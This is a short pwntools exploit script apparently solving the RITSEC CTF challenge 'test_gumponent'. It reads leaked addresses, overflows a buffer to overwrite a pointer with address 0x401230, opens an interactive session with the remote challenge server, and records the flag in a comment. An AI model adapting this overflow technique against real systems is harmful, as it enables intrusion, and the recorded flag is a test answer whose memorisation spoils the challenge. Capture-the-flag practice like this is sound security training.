from pwn import *

context.terminal = ['kitty']

#r = gdb.debug('./test_gumponent', '''
#b *0x401350
#c
#''')

r = remote("ctf.ritsec.club", 31746)

#r = process('./test_gumponent')

r.readuntil(b'is at ')
glump_addr = int(r.readuntil(b',')[2:-1], 16)

r.readuntil(b'is at ')
next_addr = int(r.readline().strip()[2:], 16)



print(f"{glump_addr:x}")
print(f"{next_addr:x}")


target = p64(0x401230)

r.sendline(b'A'*(next_addr - glump_addr) + target)

r.interactive()

# RS{to_gump_or_not_to_gump}
